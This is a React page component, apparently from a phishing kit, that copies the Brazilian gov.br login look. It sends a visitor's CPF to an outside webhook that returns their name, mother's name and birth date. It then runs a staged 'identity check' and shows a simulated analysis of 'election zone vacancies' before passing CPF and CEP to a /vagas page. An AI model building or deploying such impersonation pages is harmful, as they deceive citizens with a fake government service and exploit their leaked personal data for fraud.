import { useState, useEffect } from "react";
import { useLocation } from "wouter";

export default function Validacao() {
  const [, setLocation] = useLocation();
  const [cpf, setCpf] = useState("");
  const [userData, setUserData] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  
  const [nomeMae, setNomeMae] = useState("");
  const [dataNascimento, setDataNascimento] = useState("");
  const [estadoCivil, setEstadoCivil] = useState("");
  
  const [step, setStep] = useState(1); // 1: perguntas, 2: confirmação, 3: CEP
  const [validationError, setValidationError] = useState("");
  const [cep, setCep] = useState("");
  const [loadingCep, setLoadingCep] = useState(false);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const cpfParam = params.get("cpf");
    
    if (!cpfParam) {
      setLocation("/");
      return;
    }
    
    setCpf(cpfParam);
    fetchUserData(cpfParam);
  }, []);

  const fetchUserData = async (cpf: string) => {
    try {
      setLoading(true);
      const response = await fetch(
        `https://fluxos.kodexpert.com.br/webhook/e3358323-f6eb-42e5-8a54-7513d794b2c4/kodexpert/api/${cpf}`
      );
      
      if (!response.ok) {
        throw new Error("Erro ao buscar dados do CPF");
      }
      
      const data = await response.json();
      setUserData(data);
      setLoading(false);
    } catch (err) {
      setError("Não foi possível validar seu CPF. Tente novamente mais tarde.");
      setLoading(false);
    }
  };

  const formatDate = (dateString: string) => {
    // Converte formato DD/MM/YYYY para YYYY-MM-DD
    const parts = dateString.split("/");
    if (parts.length === 3) {
      return `${parts[2]}-${parts[1]}-${parts[0]}`;
    }
    return dateString;
  };

  const validateAnswers = () => {
    if (!userData) return;
    
    // Valida nome da mãe
    const nomeMaeNormalizado = nomeMae.trim().toLowerCase();
    const nomeMaeCorretoNormalizado = userData.nome_mae?.toLowerCase() || "";
    
    if (nomeMaeNormalizado !== nomeMaeCorretoNormalizado) {
      setValidationError("Nome da mãe incorreto. Tente novamente.");
      setTimeout(() => setValidationError(""), 3000);
      return;
    }
    
    // Valida data de nascimento
    const dataNascimentoFormatada = formatDate(userData.data_nascimento || "");
    if (dataNascimento !== dataNascimentoFormatada) {
      setValidationError("Data de nascimento incorreta. Tente novamente.");
      setTimeout(() => setValidationError(""), 3000);
      return;
    }
    
    // Estado civil aceita qualquer resposta
    if (!estadoCivil) {
      setValidationError("Por favor, informe seu estado civil.");
      setTimeout(() => setValidationError(""), 3000);
      return;
    }
    
    setStep(2);
  };

  const formatCEP = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    if (cleaned.length <= 8) {
      return cleaned.replace(/(\d{5})(\d)/, "$1-$2");
    }
    return value;
  };

  const handleCEPChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCEP(e.target.value);
    setCep(formatted);
  };

  const handleCEPSubmit = async () => {
    const cleanedCEP = cep.replace(/\D/g, "");
    
    if (cleanedCEP.length !== 8) {
      setValidationError("CEP inválido. Digite novamente.");
      setTimeout(() => setValidationError(""), 3000);
      return;
    }
    
    setLoadingCep(true);
    
    // Simula loading de 3 segundos
    setTimeout(() => {
      setLocation(`/vagas?cep=${cleanedCEP}&cpf=${cpf}`);
    }, 3000);
  };

  if (loading) {
    return (
      <>
        <header>
          <a href="#">
            <img src="/images/govbr.png" alt="Logomarca GovBR" />
          </a>
        </header>
        <div className="container">
          <main id="main-signin">
            <div className="card">
              <h3>Carregando seus dados...</h3>
              <p>Aguarde enquanto validamos suas informações.</p>
            </div>
          </main>
        </div>
      </>
    );
  }

  if (error) {
    return (
      <>
        <header>
          <a href="#">
            <img src="/images/govbr.png" alt="Logomarca GovBR" />
          </a>
        </header>
        <div className="container">
          <main id="main-signin">
            <div className="card">
              <h3>Erro na validação</h3>
              <p style={{ color: "#ff0000" }}>{error}</p>
              <button
                className="button-continuar"
                onClick={() => setLocation("/")}
              >
                Voltar
              </button>
            </div>
          </main>
        </div>
      </>
    );
  }

  return (
    <>
      <header>
        <a href="#">
          <img src="/images/govbr.png" alt="Logomarca GovBR" />
        </a>
        <div id="acessibilidade">
          <span>
            <a href="#">
              <i className="fa fa-adjust"></i>
              <span>Alto Contraste</span>
            </a>
          </span>
          <span>
            <a href="#">
              <i className="fa fa-deaf"></i>
              <span>VLibras</span>
            </a>
          </span>
        </div>
      </header>

      <div className="container">
        <aside id="aside-signin">
          <img
            id="identidade-govbr"
            src="/images/conta_govbr_v2.jpg"
            alt="Logomarca GovBR"
          />
        </aside>

        <main id="main-signin">
          {step === 1 && (
            <div className="card" id="login-cpf">
              <h3>Validação de Dados</h3>
              <p>
                Olá, <strong>{userData?.nome}</strong>! Para sua segurança,
                precisamos confirmar alguns dados.
              </p>

              <div className="accordion-panel">
                <label htmlFor="nomeMae">1. Qual o nome da sua mãe?</label>
                <input
                  id="nomeMae"
                  type="text"
                  value={nomeMae}
                  onChange={(e) => setNomeMae(e.target.value)}
                  placeholder="Nome completo da mãe"
                  style={{ marginBottom: "15px" }}
                />

                <label htmlFor="dataNascimento">
                  2. Qual sua data de nascimento?
                </label>
                <input
                  id="dataNascimento"
                  type="date"
                  value={dataNascimento}
                  onChange={(e) => setDataNascimento(e.target.value)}
                  style={{ marginBottom: "15px" }}
                />

                <label htmlFor="estadoCivil">3. Qual seu estado civil?</label>
                <select
                  id="estadoCivil"
                  value={estadoCivil}
                  onChange={(e) => setEstadoCivil(e.target.value)}
                  style={{ marginBottom: "15px", padding: "10px", width: "100%" }}
                >
                  <option value="">Selecione</option>
                  <option value="solteiro">Solteiro(a)</option>
                  <option value="casado">Casado(a)</option>
                  <option value="divorciado">Divorciado(a)</option>
                  <option value="viuvo">Viúvo(a)</option>
                  <option value="uniao_estavel">União Estável</option>
                </select>

                {validationError && (
                  <p style={{ color: "#ff0000", marginBottom: "10px" }}>
                    {validationError}
                  </p>
                )}

                <div className="button-panel">
                  <button
                    className="button-continuar"
                    onClick={validateAnswers}
                  >
                    Validar Dados
                  </button>
                </div>
              </div>
            </div>
          )}

          {step === 2 && (
            <div className="card" id="login-cpf">
              <h3>✓ Dados Validados com Sucesso!</h3>
              <p>
                Seus dados foram confirmados. Agora precisamos do seu CEP para
                verificar a disponibilidade de vagas na sua região.
              </p>
              <div className="button-panel">
                <button className="button-continuar" onClick={() => setStep(3)}>
                  Continuar
                </button>
              </div>
            </div>
          )}

          {step === 3 && (
            <div className="card" id="login-cpf">
              <h3>Informe seu CEP</h3>
              <p>
                Digite seu CEP para que possamos analisar a zona eleitoral e
                verificar se há vagas disponíveis.
              </p>

              <div className="accordion-panel">
                <label htmlFor="cep">CEP</label>
                <input
                  id="cep"
                  type="tel"
                  maxLength={9}
                  value={cep}
                  onChange={handleCEPChange}
                  placeholder="00000-000"
                  disabled={loadingCep}
                />

                {validationError && (
                  <p style={{ color: "#ff0000", marginTop: "10px" }}>
                    {validationError}
                  </p>
                )}

                {loadingCep && (
                  <p style={{ color: "#008C32", marginTop: "10px" }}>
                    Analisando disponibilidade de vagas na sua região...
                  </p>
                )}

                <div className="button-panel">
                  <button
                    className="button-continuar"
                    onClick={handleCEPSubmit}
                    disabled={loadingCep}
                  >
                    {loadingCep ? "Analisando..." : "Verificar Vagas"}
                  </button>
                </div>
              </div>
            </div>
          )}
        </main>
      </div>

      <footer></footer>
    </>
  );
}
